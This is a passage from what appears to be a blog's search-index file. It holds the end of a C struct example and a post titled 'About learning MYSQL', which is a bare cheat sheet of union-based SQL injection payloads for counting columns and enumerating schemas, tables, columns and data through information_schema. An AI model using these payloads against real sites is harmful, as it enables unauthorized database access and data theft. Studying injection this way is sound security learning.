&amp;d.b;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,z -&gt; a.name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,z -&gt; x);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">first</span> * <span class="title">m</span>;</span></span><br><span class="line">	m = &amp;d.b.a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,m -&gt; name);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>About learning MYSQL</title>
+    <url>/2017/09/24/mysql/</url>
+    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">id&#x3D;? order by n</span><br><span class="line">union select null,null,~,n</span><br><span class="line"></span><br><span class="line">#find_schema:</span><br><span class="line">union select 1,2,~,group_concat(schema_name),~,n from information_schema.schemata</span><br><span class="line">#find_tables:</span><br><span class="line">union select 1,2,~,group_concat(table_name),~,n from information_schema.tables where table_schema&#x3D;&quot;~~&quot;</span><br><span class="line">#find_columns:</span><br><span class="line">union select 1,2,~,group_concat(column_name),~,n from information_schema.columns where table_schema&#x3D;&quot;~~&quot; and table_name&#x3D;&quot;~~&quot;</span><br><span class="line"></span><br><span class="line">#get data</span><br><span class="line">union select 1,2,~,group_concat(column),~,n from schema.table</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>others</tag>
+      </tags>
+  </entry>
+</search>
